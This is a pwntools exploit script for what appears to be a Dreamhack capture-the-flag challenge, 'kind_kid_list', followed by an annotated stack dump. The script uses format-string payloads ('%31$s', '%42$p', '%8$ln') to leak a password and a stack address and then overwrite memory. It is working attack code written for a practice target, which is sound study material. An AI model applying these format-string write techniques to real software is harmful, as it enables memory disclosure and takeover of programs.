from pwn import *

#p = remote('host3.dreamhack.games', 10392)
p = process("./kind_kid_list")

p.sendlineafter(b">>", b"2")
p.sendlineafter(b"Password :", b"%31$s")
password = p.recvuntil(b"is")[:-3]


p.sendlineafter(b">>", b"2")
p.sendlineafter(b"Password :", password)
p.sendlineafter(b"Name : ", b"wyv3rn")


p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password :", b"%42$p")
dest = int(p.recvuntil(b"is")[:-3].ljust(8, b"\x00"), 16) - 0x1d8

p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password :", password)
p.sendlineafter(b"Name : ", p64(dest))

p.sendlineafter(b">> ", b'2')
p.sendlineafter(b"Password :", b"a%8$ln")

p.interactive()


'''             (RSP)
0x7fffffffdbf0: 0x7025702570256161      0x0000000000000000
0x7fffffffdc00: 0x0000000000000000      0x0000000000000000 8
0x7fffffffdc10: 0x00006e7233767977      0x0000000000000000
0x7fffffffdc20: 0x0000000000000000      0x0000000000000000 12
0x7fffffffdc30: 0x0000000000000000      0x0000000000000000
0x7fffffffdc40: 0x0000000000000000      0x0000000000000000 16
0x7fffffffdc50: 0x0000000000000000      0x0000000000000000
0x7fffffffdc60: 0x0000000000000000      0x0000000000000000 20
0x7fffffffdc70: 0x0000000000000000      0x0000000000000000
0x7fffffffdc80: 0x0000000000000000      0x0000000000000000 24
0x7fffffffdc90: 0x0000000000000000      0x0000000000000000
0x7fffffffdca0: 0x3376797700000002      0x0000000200006e72 28
0x7fffffffdcb0: 0x00005555555592c0      0x00005555555592a0 31 <- ptr
0x7fffffffdcc0: 0x0000000000001000      0x0000000000000000 32
0x7fffffffdcd0: 0x0000000000000001      0x00007ffff7db5d90 
0x7fffffffdce0: 0x0000000000000000      0x00005555555553ce 36
0x7fffffffdcf0: 0x00000001ffffddd0      0x00007fffffffdde8 39 <- dt
0x7fffffffdd00: 0x0000000000000000      0xebd3f74963b0de47 40
0x7fffffffdd10: 0x00007fffffffdde8      0x00005555555553ce
0x7fffffffdd20: 0x0000555555557dd8      0x00007ffff7ffd040
0x7fffffffdd30: 0x142c08b6da72de47      0x142c18ffd93ade47
0x7fffffffdd40: 0x00007fff00000000      0x0000000000000000
0x7fffffffdd50: 0x0000000000000000      0x0000000000000000
0x7fffffffdd60: 0x0000000000000000      0xc486db09b5d70800
0x7fffffffdd70: 0x0000000000000000      0x00007ffff7db5e40

fs
aa0x7fffffffdbf00x610xffffffff
'''